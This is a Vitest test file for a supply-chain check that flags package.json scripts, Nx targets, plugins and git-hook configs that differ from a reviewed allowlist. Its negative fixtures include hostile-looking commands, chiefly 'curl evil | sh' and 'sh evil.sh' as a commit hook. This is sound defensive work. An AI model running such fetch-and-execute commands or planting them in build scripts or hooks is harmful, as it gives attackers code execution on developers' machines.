import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { describe, expect, it } from 'vitest';
import { checkRepoTasks, checkTasks, findProjectFiles } from './tasks.mjs';

const allowlist = {
  scripts: { 'package.json#verify': 'nx run-many -t test' },
  targets: {
    'apps/a/package.json#deploy': {
      executor: 'nx:run-commands',
      options: { command: 'node tools/pages/src/assemble.mjs' },
    },
  },
  gitHooks: {
    'package.json#simple-git-hooks': { 'pre-commit': 'pnpm exec lint-staged' },
    'package.json#lint-staged': { '*': 'prettier --write' },
  },
  executors: ['@nx/js:tsc'],
  nxPlugins: ['@nx/vite/plugin'],
};
const pkg = (path, json) => ({ path, json });

describe('A7: task definitions', () => {
  it('accepts reviewed scripts, targets, executors and plugins', () => {
    expect(
      checkTasks(
        allowlist,
        [
          pkg('package.json', { scripts: { verify: 'nx run-many -t test' } }),
          pkg('apps/a/package.json', {
            nx: {
              targets: {
                deploy: allowlist.targets['apps/a/package.json#deploy'],
                build: { executor: '@nx/js:tsc', options: {} },
                test: { dependsOn: ['^build'] },
              },
            },
          }),
        ],
        { plugins: [{ plugin: '@nx/vite/plugin', options: {} }] },
      ),
    ).toEqual([]);
  });

  it('pins git-hook commands (`git commit` runs them)', () => {
    const hooks = {
      'simple-git-hooks': { 'pre-commit': 'pnpm exec lint-staged' },
      'lint-staged': { '*': 'prettier --write' },
    };
    expect(checkTasks(allowlist, [pkg('package.json', hooks)], {})).toEqual([]);
    expect(
      checkTasks(
        allowlist,
        [
          pkg('package.json', {
            ...hooks,
            'lint-staged': { '*': 'sh evil.sh' },
          }),
        ],
        {},
      ),
    ).toEqual([
      'A7: package.json#lint-staged differs from the reviewed entry in tools/security/tasks.json.',
    ]);
    expect(
      checkTasks(
        allowlist,
        [
          pkg('libs/x/package.json', {
            'simple-git-hooks': { 'pre-push': 'x' },
          }),
        ],
        {},
      ),
    ).toEqual([
      'A7: libs/x/package.json#simple-git-hooks is not in tools/security/tasks.json.',
    ]);
  });

  it('rejects a changed root script (pre-approved `pnpm verify` runs it)', () => {
    expect(
      checkTasks(
        allowlist,
        [pkg('package.json', { scripts: { verify: 'curl evil | sh' } })],
        {},
      ),
    ).toEqual([
      'A7: package.json#verify differs from the reviewed entry in tools/security/tasks.json.',
    ]);
  });

  it('rejects a new project script (Nx turns it into a target)', () => {
    expect(
      checkTasks(
        allowlist,
        [pkg('libs/x/package.json', { scripts: { test: 'sh -c id' } })],
        {},
      ),
    ).toEqual([
      'A7: libs/x/package.json#test is not in tools/security/tasks.json.',
    ]);
  });

  it.each([
    ['explicit run-commands', { executor: 'nx:run-commands', options: {} }],
    ['command shorthand', { command: 'id' }],
    ['options.commands', { options: { commands: ['id'] } }],
    ['run-script', { executor: 'nx:run-script', options: { script: 'x' } }],
    ['unlisted executor', { executor: './tools/evil:run' }],
  ])('rejects an unreviewed target (%s)', (_, target) => {
    expect(
      checkTasks(
        allowlist,
        [pkg('apps/a/package.json', { nx: { targets: { test: target } } })],
        {},
      ),
    ).toHaveLength(1);
    expect(
      checkTasks(
        allowlist,
        [pkg('apps/a/project.json', { targets: { test: target } })],
        {},
      ),
    ).toHaveLength(1);
  });

  it('rejects an edited reviewed target', () => {
    expect(
      checkTasks(
        allowlist,
        [
          pkg('apps/a/package.json', {
            nx: {
              targets: {
                deploy: {
                  executor: 'nx:run-commands',
                  options: { command: 'id' },
                },
              },
            },
          }),
        ],
        {},
      ),
    ).toHaveLength(1);
  });

  it('rejects run-commands in nx.json targetDefaults and unlisted plugins', () => {
    expect(
      checkTasks(allowlist, [], {
        targetDefaults: {
          test: { command: 'id' },
          '@nx/js:tsc': { cache: true },
        },
        plugins: ['./tools/my-plugin', '@nx/vite/plugin'],
      }),
    ).toEqual([
      'A7: nx.json#targetDefaults.test is not in tools/security/tasks.json.',
      'A7: Nx plugin "./tools/my-plugin" in nx.json is not in tools/security/tasks.json (plugins define targets and run on every nx command).',
    ]);
  });

  it('finds project files everywhere except node_modules/.git/.nx', () => {
    const root = mkdtempSync(join(tmpdir(), 'tasks-'));
    for (const dir of ['a', 'b/dist', 'node_modules/x', '.git', '.nx'])
      mkdirSync(join(root, dir), { recursive: true });
    for (const file of [
      'package.json',
      'a/project.json',
      'b/dist/package.json',
      'node_modules/x/package.json',
      '.git/package.json',
      '.nx/package.json',
    ])
      writeFileSync(join(root, file), '{}');
    symlinkSync(join(root, 'a'), join(root, 'link'));
    expect(findProjectFiles(root)).toEqual([
      'a/project.json',
      'b/dist/package.json',
      'package.json',
    ]);
  });
});

describe('A7: git-hook config outside package.json', () => {
  const repo = (files) => {
    const root = mkdtempSync(join(tmpdir(), 'a7-hooks-'));
    writeFileSync(join(root, 'package.json'), '{}');
    for (const [name, content] of Object.entries(files)) {
      if (content === null) mkdirSync(join(root, name));
      else writeFileSync(join(root, name), content);
    }
    const allowlist = join(root, 'tasks.json');
    writeFileSync(
      allowlist,
      JSON.stringify({
        scripts: {},
        targets: {},
        executors: [],
        nxPlugins: [],
      }),
    );
    return { root, allowlist };
  };

  it.each([
    '.lintstagedrc.json',
    'lint-staged.config.mjs',
    '.simple-git-hooks.json',
  ])('flags %s', (name) => {
    const { root, allowlist } = repo({ [name]: '{}' });
    expect(checkRepoTasks(root, allowlist)).toEqual([
      expect.stringContaining(`A7: ${name} defines git hooks`),
    ]);
  });

  it('flags a .husky directory', () => {
    const { root, allowlist } = repo({ '.husky': null });
    expect(checkRepoTasks(root, allowlist)).toEqual([
      expect.stringContaining('A7: .husky defines git hooks'),
    ]);
  });

  it('is quiet without hook files', () => {
    const { root, allowlist } = repo({});
    expect(checkRepoTasks(root, allowlist)).toEqual([]);
  });
});

describe('this repository', () => {
  it('matches tools/security/tasks.json', () => {
    const root = resolve(import.meta.dirname, '../../..');
    expect(
      checkRepoTasks(root, resolve(import.meta.dirname, '../tasks.json')),
    ).toEqual([]);
  });
});
